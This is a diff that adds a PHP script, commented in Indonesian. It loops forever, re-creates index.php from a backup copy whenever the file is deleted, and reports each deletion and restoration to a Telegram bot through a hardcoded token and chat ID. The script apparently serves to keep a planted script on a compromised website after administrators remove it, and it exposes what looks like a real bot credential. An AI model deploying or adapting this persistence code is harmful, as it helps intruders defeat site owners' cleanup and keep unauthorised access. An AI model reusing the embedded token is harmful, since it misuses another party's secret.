@@ -1,0 +1,70 @@
+<?php
+// Aktifkan pelaporan kesalahan
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Pencipta: Parlin-Shifu
+
+function sendTelegramNotification($message) {
+    $token = '7777897227:AAE8c4lxW8Qq7hs--jtdYeA0bRwqVFmdH8c'; // Token bot Anda
+    $chat_id = '7563612806'; // Chat ID Anda
+    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($message);
+
+    // Menggunakan cURL untuk mengirim notifikasi
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    
+    if ($response === false) {
+        error_log('Telegram notification failed: ' . curl_error($ch));
+    }
+    
+    curl_close($ch);
+}
+
+// Path ke file yang akan dipantau
+$scriptPath = __DIR__ . '/index.php';
+// Path ke file cadangan
+$backupPath = __DIR__ . '/backup/index.php';
+
+// Variabel untuk status notifikasi
+$fileDeleted = false; // Status untuk notifikasi penghapusan
+$fileRestored = false; // Status untuk notifikasi upload kembali
+
+// Fungsi untuk mengembalikan file dari cadangan
+function restoreFile($source, $destination) {
+    if (copy($source, $destination)) {
+        return true;
+    } else {
+        error_log('Failed to restore file from backup: ' . $source);
+        return false;
+    }
+}
+
+// Loop tanpa henti untuk memantau keberadaan file
+while (true) {
+    if (!file_exists($scriptPath)) {
+        // Kirim notifikasi jika file dihapus dan belum diberi notifikasi
+        if (!$fileDeleted) {
+            sendTelegramNotification("Script telah dihapus: " . $scriptPath);
+            $fileDeleted = true; // Set status notifikasi penghapusan
+
+            // Restore file dari cadangan
+            if (restoreFile($backupPath, $scriptPath)) {
+                sendTelegramNotification("Script telah diupload kembali: " . $scriptPath);
+                $fileRestored = true; // Set status notifikasi upload kembali
+            }
+        }
+    } else {
+        // Kirim notifikasi jika file ditemukan kembali dan belum diberi notifikasi
+        if (!$fileRestored) {
+            sendTelegramNotification("Script telah ditemukan kembali: " . $scriptPath);
+            $fileRestored = true; // Set status notifikasi upload kembali
+        }
+        // Reset status jika file dihapus kembali
+        $fileDeleted = false; // Reset status jika file ditemukan kembali
+    }
+    
+    sleep(10); // Cek setiap 10 detik
+}
+?>
